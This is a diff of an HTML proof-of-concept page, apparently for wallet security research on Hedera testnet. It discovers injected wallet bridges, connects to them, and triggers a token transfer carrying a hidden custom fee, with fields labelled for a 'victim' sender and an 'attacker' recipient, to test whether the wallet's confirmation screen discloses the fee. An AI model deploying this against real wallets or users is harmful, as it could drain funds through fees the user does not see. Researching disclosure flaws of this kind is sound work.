@@ -1,260 +1,184 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-
-  <title>Hedera Custom Fee PoC</title>
-
-  <style>
-    * {
-      box-sizing: border-box;
-    }
-
-    body {
-      margin: 0;
-      padding: 24px 16px;
-      background: #f5f6f8;
-      color: #111;
-      font-family: Arial, sans-serif;
-    }
-
-    .card {
-      max-width: 500px;
-      margin: auto;
-      background: white;
-      border-radius: 18px;
-      padding: 24px;
-      box-shadow: 0 8px 30px rgba(0,0,0,.08);
-    }
-
-    h1 {
-      margin-top: 0;
-    }
-
-    .warning {
-      padding: 14px;
-      border-radius: 10px;
-      background: #fff3cd;
-      color: #664d03;
-      margin: 18px 0;
-    }
-
-    .row {
-      display: flex;
-      justify-content: space-between;
-      padding: 12px 0;
-      border-bottom: 1px solid #eee;
-    }
-
-    .label {
-      color: #777;
-    }
-
-    button {
-      width: 100%;
-      margin-top: 20px;
-      padding: 16px;
-      border: 0;
-      border-radius: 12px;
-      background: #111827;
-      color: white;
-      font-size: 17px;
-      font-weight: bold;
-    }
-
-    /* POPUP */
-
-    #overlay {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,.65);
-      z-index: 9999;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-
-    #popup {
-      width: 100%;
-      max-width: 430px;
-      background: white;
-      border-radius: 20px;
-      padding: 24px;
-      box-shadow: 0 20px 60px rgba(0,0,0,.35);
-    }
-
-    .popup-title {
-      font-size: 21px;
-      font-weight: bold;
-      margin-bottom: 20px;
-    }
-
-    .token {
-      padding: 14px;
-      background: #f3f4f6;
-      border-radius: 12px;
-      margin-bottom: 16px;
-    }
-
-    .fee-box {
-      margin: 18px 0;
-      padding: 18px;
-      border-radius: 12px;
-      background: #fff7ed;
-      border: 1px solid #fdba74;
-    }
-
-    .fee-title {
-      color: #9a3412;
-      font-size: 14px;
-    }
-
-    .fee {
-      font-size: 30px;
-      font-weight: 800;
-      color: #c2410c;
-      margin-top: 4px;
-    }
-
-    .total {
-      display: flex;
-      justify-content: space-between;
-      font-weight: bold;
-      padding-top: 12px;
-      border-top: 1px solid #ddd;
-    }
-
-    .approve {
-      background: #16a34a;
-    }
-
-    .cancel {
-      background: #e5e7eb;
-      color: #111;
-      margin-top: 10px;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Wallet Bridge Fee Disclosure PoC</title>
+<script src="https://unpkg.com/@hashgraph/sdk@2/dist/browser/esm/index.min.js" type="module" id="sdk-module"></script>
+<style>
+  body { font-family: -apple-system, sans-serif; background: #0d0d0d; color: #e6e6e6; padding: 16px; margin: 0; }
+  h1 { font-size: 18px; margin-bottom: 4px; }
+  .sub { color: #999; font-size: 12px; margin-bottom: 16px; }
+  label { display: block; font-size: 12px; color: #aaa; margin-top: 10px; }
+  input { width: 100%; box-sizing: border-box; padding: 8px; border-radius: 6px; border: 1px solid #333; background: #1a1a1a; color: #fff; font-size: 14px; margin-top: 4px; }
+  button { width: 100%; padding: 12px; margin-top: 12px; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; }
+  #discoverBtn { background: #2b6cb0; color: #fff; }
+  #connectBtn { background: #38a169; color: #fff; }
+  #sendBtn { background: #c53030; color: #fff; }
+  #log { margin-top: 16px; background: #111; border: 1px solid #222; border-radius: 8px; padding: 10px; height: 300px; overflow-y: auto; font-family: monospace; font-size: 11px; white-space: pre-wrap; word-break: break-all; }
+  .ok { color: #68d391; }
+  .err { color: #fc8181; }
+  .info { color: #63b3ed; }
+</style>
 </head>
-
 <body>
 
-<div class="card">
+<h1>Wallet Bridge Fee Disclosure PoC</h1>
+<div class="sub">Testnet only. Discovers the injected wallet bridge, then attempts to trigger a token send carrying a hidden custom fee, to check whether the confirmation UI discloses it.</div>
 
-  <h1>Hedera Custom Fee PoC</h1>
+<button id="discoverBtn">1. Discover Injected Bridge</button>
+<button id="connectBtn">2. Connect Wallet</button>
 
-  <div class="warning">
-    <strong>TESTNET ONLY</strong><br>
-    Controlled security research demonstration.
-  </div>
+<label>Token ID (the malicious custom-fee token, e.g. 0.0.10037892)</label>
+<input id="tokenId" placeholder="0.0.xxxxxxx" />
 
-  <div class="row">
-    <span class="label">Network</span>
-    <strong>Hedera Testnet</strong>
-  </div>
+<label>Sender Account ID (your connected/victim test account)</label>
+<input id="senderId" placeholder="0.0.xxxxxxx" />
 
-  <div class="row">
-    <span class="label">Token</span>
-    <strong>0.0.10037892</strong>
-  </div>
+<label>Recipient Account ID (attacker/fee-collector or any test account)</label>
+<input id="recipientId" placeholder="0.0.xxxxxxx" />
 
-  <div class="row">
-    <span class="label">Amount</span>
-    <strong>1 token</strong>
-  </div>
+<label>Amount (smallest unit, e.g. 1000 = 1000 tinytoken units)</label>
+<input id="amount" value="1000" />
 
-  <div class="row">
-    <span class="label">Recipient</span>
-    <strong>0.0.10015061</strong>
-  </div>
+<button id="sendBtn">3. Trigger Send (watch the popup)</button>
 
-  <button onclick="showPopup()">
-    Send Test Token
-  </button>
+<div id="log">Waiting...\n</div>
 
-</div>
+<script type="module">
+  const logEl = document.getElementById("log");
+  function log(msg, cls = "") {
+    const line = document.createElement("div");
+    if (cls) line.className = cls;
+    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    logEl.appendChild(line);
+    logEl.scrollTop = logEl.scrollHeight;
+  }
 
+  // Common names wallets inject under. Add more here as you discover them.
+  const CANDIDATE_GLOBALS = [
+    "hashpack",
+    "saucerswapWallet",
+    "hashconnect",
+    "hederaWallet",
+    "ethereum", // in case EVM-style provider is also exposed
+  ];
 
-<!-- POPUP -->
+  let activeBridgeName = null;
 
-<div id="overlay">
+  function inspectObject(obj, name, depth = 0) {
+    if (!obj || depth > 1) return;
+    const keys = Object.keys(obj).concat(
+      Object.getOwnPropertyNames(Object.getPrototypeOf(obj) || {})
+    );
+    const uniqueKeys = [...new Set(keys)].filter(
+      (k) => !["constructor"].includes(k)
+    );
+    uniqueKeys.forEach((k) => {
+      let type;
+      try {
+        type = typeof obj[k];
+      } catch (e) {
+        type = "unreadable";
+      }
+      log(`  window.${name}.${k} -> ${type}`, "info");
+    });
+  }
 
-  <div id="popup">
+  document.getElementById("discoverBtn").addEventListener("click", () => {
+    log("Scanning window for injected wallet bridges...");
+    let found = 0;
+    CANDIDATE_GLOBALS.forEach((name) => {
+      if (window[name]) {
+        found++;
+        activeBridgeName = activeBridgeName || name;
+        log(`FOUND: window.${name}`, "ok");
+        inspectObject(window[name], name);
+      }
+    });
+    if (found === 0) {
+      log("No known bridge object found under common names. Open this page's URL bar / check console manually, or add candidate names to CANDIDATE_GLOBALS.", "err");
+    } else {
+      log(`Using "${activeBridgeName}" as active bridge for connect/send.`, "info");
+    }
+  });
 
-    <div class="popup-title">
-      Confirm Transaction
-    </div>
+  document.getElementById("connectBtn").addEventListener("click", async () => {
+    if (!activeBridgeName) {
+      log("Run Discover first.", "err");
+      return;
+    }
+    const bridge = window[activeBridgeName];
+    const attempts = ["connect", "requestAccounts", "enable", "pair"];
+    for (const fn of attempts) {
+      if (typeof bridge[fn] === "function") {
+        try {
+          log(`Trying ${activeBridgeName}.${fn}()...`);
+          const result = await bridge[fn]();
+          log(`SUCCESS ${fn}(): ${JSON.stringify(result)}`, "ok");
+          return;
+        } catch (e) {
+          log(`${fn}() failed: ${e.message}`, "err");
+        }
+      }
+    }
+    log("No working connect method found among: " + attempts.join(", "), "err");
+  });
 
-    <div class="token">
-      <strong>Send</strong><br>
-      1 × 0.0.10037892
-      <br><br>
-      <strong>To</strong><br>
-      0.0.10015061
-    </div>
+  document.getElementById("sendBtn").addEventListener("click", async () => {
+    if (!activeBridgeName) {
+      log("Run Discover first.", "err");
+      return;
+    }
+    const bridge = window[activeBridgeName];
+    const tokenId = document.getElementById("tokenId").value.trim();
+    const senderId = document.getElementById("senderId").value.trim();
+    const recipientId = document.getElementById("recipientId").value.trim();
+    const amount = parseInt(document.getElementById("amount").value.trim(), 10);
 
-    <div class="fee-box">
+    if (!tokenId || !senderId || !recipientId || !amount) {
+      log("Fill in all fields first.", "err");
+      return;
+    }
 
-      <div class="fee-title">
-        Native token custom fee
-      </div>
+    log("Building TransferTransaction bytes via @hashgraph/sdk...");
+    try {
+      const { TransferTransaction, AccountId, TokenId } = await import(
+        "https://unpkg.com/@hashgraph/sdk@2/dist/browser/esm/index.min.js"
+      );
+      const tx = new TransferTransaction()
+        .addTokenTransfer(TokenId.fromString(tokenId), AccountId.fromString(senderId), -amount)
+        .addTokenTransfer(TokenId.fromString(tokenId), AccountId.fromString(recipientId), amount)
+        .setTransactionId(undefined) // let wallet fill in
+        .setMaxTransactionFee(100000000); // 1 HBAR max, adjust as needed
 
-      <div class="fee">
-        7 HBAR
-      </div>
+      const bytes = tx.toBytes ? tx.toBytes() : null;
+      log(`Transaction built. Byte length: ${bytes ? bytes.length : "n/a"}`, "info");
 
-      <div class="fee-title">
-        Plus ordinary Hedera network transaction fee
-      </div>
+      const attempts = ["signTransaction", "sendTransaction", "signAndSendTransaction", "executeTransaction"];
+      let triggered = false;
+      for (const fn of attempts) {
+        if (typeof bridge[fn] === "function") {
+          triggered = true;
+          try {
+            log(`Calling ${activeBridgeName}.${fn}(bytes)... watch your wallet app now for the confirmation popup.`);
+            const result = await bridge[fn](bytes);
+            log(`Response from ${fn}(): ${JSON.stringify(result)}`, "ok");
+          } catch (e) {
+            log(`${fn}() error/rejected: ${e.message}`, "err");
+          }
+          break; // stop after first method that exists; remove this break to try all
+        }
+      }
+      if (!triggered) {
+        log("No known send/sign method found among: " + attempts.join(", ") + ". Check Discover output above for the real method name and tell Claude what you see.", "err");
+      }
+    } catch (e) {
+      log(`Failed to build/send transaction: ${e.message}`, "err");
+    }
+  });
 
-    </div>
-
-    <div class="total">
-      <span>Custom fee</span>
-      <span>7 HBAR</span>
-    </div>
-
-    <button class="approve" onclick="approve()">
-      Continue to Wallet
-    </button>
-
-    <button class="cancel" onclick="closePopup()">
-      Cancel
-    </button>
-
-  </div>
-
-</div>
-
-
-<script>
-
-function showPopup() {
-  document.getElementById("overlay").style.display = "flex";
-}
-
-function closePopup() {
-  document.getElementById("overlay").style.display = "none";
-}
-
-function approve() {
-
-  /*
-   * For now this only demonstrates the popup.
-
-   * Next step is replacing this alert with:
-   *
-   * window.saucerswapWallet.signTransaction(...)
-   *
-   * using the real serialized Hedera transaction.
-   */
-
-  alert(
-    "Wallet signing step would be requested here."
-  );
-}
-
+  log("Page ready. Tap 'Discover Injected Bridge' first.");
 </script>
 
 </body>
